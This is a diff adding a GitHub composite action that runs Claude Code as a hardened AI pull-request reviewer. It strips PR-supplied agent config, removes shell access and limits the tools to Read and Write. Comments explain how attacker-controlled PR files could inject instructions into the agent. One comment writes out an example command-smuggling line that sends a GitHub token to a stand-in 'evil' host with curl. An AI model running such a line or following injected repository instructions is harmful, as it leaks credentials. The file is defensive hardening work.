@@ -1,0 +1,216 @@
+name: ai_review_engine_anthropic
+description: >
+  AI PR review engine — Claude Code Action. Reads a pre-built review context and
+  a pre-fetched PR diff, reviews the checked-out code, and writes the review
+  markdown to a file. The model is granted no shell tool, and is instructed not
+  to comment; the calling workflow owns comment posting. See the note on
+  github_token below for what this engine does and does not enforce.
+
+# ENGINE CONTRACT (see .github/workflows/AI_PR_REVIEW_README.md)
+#
+# The caller guarantees: PR head is checked out; review_context_path and
+# pr_diff_path exist and are non-empty; the access gate has passed.
+#
+# This engine must: strip PR-supplied agent config FIRST, grant the model no
+# shell tool, write the review to output_path, and fail with an engine-named
+# message if it wrote nothing. It must not post PR comments or reach the GitHub
+# API on the model's behalf.
+#
+# Composite-action gotchas that constrain this file:
+#   - `secrets` is not readable here, so api_key arrives as an input.
+#     `github.token` IS reachable (precedent: post_preview_build_comment).
+#   - `timeout-minutes` is invalid on the steps below; the caller's dispatch
+#     step carries it.
+#   - `uses:` takes no expressions, so the claude-code-action SHA is pinned
+#     literally below and bumped by PR. This is the same governance as the Kimi
+#     engine's `cli_version` input, enforced by a different mechanism.
+
+inputs:
+  review_context_path:
+    description: "Path to the pre-built review context markdown (instructions, PR metadata, previous review, acknowledged suggestions, required output format). Built by the caller."
+    required: false
+    default: "/tmp/review_context.md"
+  pr_diff_path:
+    description: "Path to the pre-fetched PR diff. Fetched by the caller with the trusted token so this engine needs no shell tool."
+    required: false
+    default: "/tmp/pr_diff.txt"
+  output_path:
+    description: "Path this engine MUST write the final review markdown to."
+    required: false
+    default: "/tmp/ai_review_output.txt"
+  repository:
+    description: "owner/repo of the PR under review (prompt preamble only)."
+    required: true
+  pr_number:
+    description: "Number of the PR under review (prompt preamble only)."
+    required: true
+  model:
+    description: "Claude model ID, e.g. claude-sonnet-5. Passed via claude_args --model (the action's `model` input was removed upstream)."
+    required: false
+    default: "claude-sonnet-5"
+  base_url:
+    description: "LLM API base URL. A trailing /v1 is REMOVED before use — the Anthropic SDK appends /v1/messages itself. Accepting it and stripping means one caller-facing value works for every engine, so flipping `engine` never silently 404s."
+    required: false
+    default: "https://litellmsa.deriv.ai/v1"
+  api_key:
+    description: "API key for base_url (a LiteLLM virtual key with the default base_url). Composite actions cannot read the `secrets` context, so the caller must pass this explicitly."
+    required: true
+
+outputs:
+  output_path:
+    description: "Path the review markdown was written to."
+    value: ${{ steps.verify.outputs.output_path }}
+
+runs:
+  using: composite
+  steps:
+    # Security boundary, not hygiene — and broader than the file this engine was
+    # extracted from, which stripped only CLAUDE.md. Claude Code reads CLAUDE.md,
+    # CLAUDE.local.md and AGENTS.md as instructions; .claude/settings.json can
+    # declare HOOKS that execute arbitrary commands; .mcp.json can declare MCP
+    # servers; .claude-plugin is a plugin manifest. None of those are gated by
+    # the --allowedTools allowlist below, and all of them are PR-controlled.
+    # These paths are engine-specific: another engine must revisit this list.
+    - name: Strip PR-supplied agent config (Claude Code)
+      shell: bash
+      working-directory: ${{ github.workspace }}
+      run: |
+        # Recursive, not root-only. Per Claude Code's memory docs: "Claude also
+        # discovers CLAUDE.md and CLAUDE.local.md files in subdirectories under
+        # your current working directory... they are included when Claude reads
+        # files in those subdirectories." Nested .claude/rules/*.md load the same
+        # way (path-scoped rules trigger when a matching file is read). This
+        # review's prompt tells the model to traverse into dependencies, so a
+        # nested packages/foo/CLAUDE.md would reach it as trusted instructions
+        # even with the root file deleted.
+        #
+        # AGENTS.md is stripped defensively — Claude Code does not read it
+        # natively ("Claude Code reads CLAUDE.md, not AGENTS.md") but a CLAUDE.md
+        # can @import it, and other engines do read it.
+        #
+        # .git is pruned so the sweep cannot corrupt the checkout.
+        find . -name .git -prune -o -type f \
+          \( -name 'CLAUDE.md' -o -name 'CLAUDE.local.md' -o -name 'AGENTS.md' -o -name '.mcp.json' \) \
+          -print0 | xargs -0 -r rm -f
+        find . -name .git -prune -o -type d \
+          \( -name '.claude' -o -name '.claude-plugin' \) \
+          -print0 | xargs -0 -r rm -rf
+        echo "✅ Stripped PR-supplied agent config (recursive)"
+
+        # Persistent self-hosted runner: clear cross-run agent state too.
+        rm -rf "$HOME/.claude"
+        rm -f "$HOME/.claude.json"
+
+    - name: Resolve base URL and verify inputs
+      id: resolve
+      shell: bash
+      env:
+        INPUT_BASE_URL: ${{ inputs.base_url }}
+        CONTEXT_PATH: ${{ inputs.review_context_path }}
+        DIFF_PATH: ${{ inputs.pr_diff_path }}
+      run: |
+        [[ -s "$CONTEXT_PATH" ]] || { echo "❌ Anthropic engine: missing or empty review context at $CONTEXT_PATH"; exit 1; }
+        [[ -s "$DIFF_PATH"    ]] || { echo "❌ Anthropic engine: missing or empty PR diff at $DIFF_PATH"; exit 1; }
+
+        # ANTHROPIC_BASE_URL must NOT carry /v1 — the SDK appends /v1/messages.
+        # Emitted as a step OUTPUT rather than via $GITHUB_ENV, because env
+        # written inside a composite action leaks into the caller's later steps.
+        BASE_URL="${INPUT_BASE_URL%/}"
+        BASE_URL="${BASE_URL%/v1}"
+        echo "base_url=$BASE_URL" >> "$GITHUB_OUTPUT"
+        echo "🔧 Anthropic engine | model=${{ inputs.model }} | base_url=$BASE_URL"
+
+    - name: Claude Code PR review
+      # Not a release tag — this is the SHA claude-pr-review.yml was pinned to
+      # (2026-05-01, "bump Claude Code to 2.1.126"). Carried over unchanged so the
+      # engine behaves identically to the workflow it replaces.
+      uses: anthropics/claude-code-action@fefa07e9c665b7320f08c3b525980457f22f58aa
+      env:
+        ANTHROPIC_BASE_URL: ${{ steps.resolve.outputs.base_url }}
+        ANTHROPIC_AUTH_TOKEN: ${{ inputs.api_key }}
+        CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: "1"
+        CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS: "1"
+        DISABLE_NON_ESSENTIAL_MODEL_CALLS: "1"
+      with:
+        anthropic_api_key: ${{ inputs.api_key }}
+        # The action needs a token for its own actor/permission checks.
+        #
+        # Be precise about what this engine does and does not guarantee, because
+        # it is weaker than the Kimi engine's. Per the action's docs at the pinned
+        # SHA: "The base GitHub tools are always included" — so --allowedTools ADDS
+        # to a base set rather than replacing it, and some GitHub tool surface is
+        # not removable. What IS established: Claude "cannot execute Bash commands
+        # unless explicitly allowed", so omitting Bash genuinely removes shell
+        # access; and it "cannot post multiple comments" / "cannot submit formal
+        # PR reviews" by design.
+        #
+        # So "exactly one review comment" rests on three things here, not one:
+        #   1. track_progress is off, so there is no tracking comment to update
+        #   2. the prompt explicitly forbids commenting (step 5 below)
+        #   3. the caller deletes any marker-matching comment before posting
+        # Unlike the Kimi engine, it is NOT enforced by the tool surface alone.
+        github_token: ${{ github.token }}
+        # track_progress is deliberately NOT set. It forces tag mode, which makes
+        # the action post and update its own tracking comment on the PR — that
+        # would break this engine's "posts no comments" contract, and the caller's
+        # cleanup step only reaps comments carrying the review marker, so tracking
+        # comments would accumulate on every PR forever.
+        show_full_output: true
+        prompt: |
+          REPO: ${{ inputs.repository }}
+          PR NUMBER: ${{ inputs.pr_number }}
+
+          Follow these steps:
+
+          1. Read ${{ inputs.review_context_path }} — it contains full review instructions, PR context, previous review (if any), acknowledged suggestions to skip, and the required output format.
+
+          2. Read ${{ inputs.pr_diff_path }} — it contains the full diff for this PR (changed files and hunks), already fetched for you. You have no shell tool; everything you need is on disk.
+
+          3. For each changed file, use Read to open the full file — not just the diff hunk.
+             Full file context is required to understand the complete impact of each change.
+
+          4. For each changed file, identify and Read its dependencies:
+             - Imported modules, utilities, or shared helpers referenced in the changed code
+             - Type definitions, interfaces, or enums used by the changed code
+             - Parent components or callers if the changed file exports something modified
+             - Related test files (e.g. *.spec.ts, *.test.ts) to assess coverage gaps
+
+          5. After reading ALL files and dependencies, compile your complete review.
+             Write the ENTIRE review to ${{ inputs.output_path }} using the Write tool.
+             Do NOT post, create or update any PR or issue comment, and do not use
+             any GitHub tool to publish your review. Writing the file is the whole
+             job — the caller posts it as a single comment.
+        # Bash is dropped entirely: the diff is pre-fetched, so the previous
+        # `Bash(gh pr diff:*)` grant bought nothing and rested on the CLI's
+        # command-pattern matching being argv-aware — under a naive prefix match,
+        # `gh pr diff N; curl evil -d "$GH_TOKEN"` carries the allowed prefix, and
+        # the review input is attacker-influenced PR content. The action's docs
+        # confirm Bash is off unless explicitly allowed, so this one is airtight.
+        #
+        # `Write` is granted unscoped, unlike the Kimi engine which confines it to
+        # the output directory. Path-scoped patterns are only documented here for
+        # Bash (`Bash(npm install)`), and the workflow this replaced carried an
+        # explicit note that a scoped `Write(/path)` made the tool unavailable
+        # altogether. Since an unavailable Write means the engine silently reviews
+        # and writes nothing, tightening this needs a real run to verify, not a
+        # guess — tracked in the PR test plan. Until then the asymmetry is real
+        # and documented rather than papered over.
+        claude_args: |
+          --model ${{ inputs.model }}
+          --allowedTools "Read,Write"
+
+    - name: Verify review output
+      id: verify
+      shell: bash
+      env:
+        OUTPUT_PATH: ${{ inputs.output_path }}
+      run: |
+        # Fail here, named, rather than letting the caller report a generic
+        # "review file missing" — all steps in a composite action share one log
+        # group, so an engine-attributed error is what makes this locatable.
+        if [[ ! -s "$OUTPUT_PATH" ]]; then
+          echo "❌ Anthropic engine: claude-code-action finished but wrote no review to $OUTPUT_PATH"
+          exit 1
+        fi
+        echo "✅ Anthropic engine: review written ($(wc -c < "$OUTPUT_PATH") bytes)"
+        echo "output_path=$OUTPUT_PATH" >> "$GITHUB_OUTPUT"
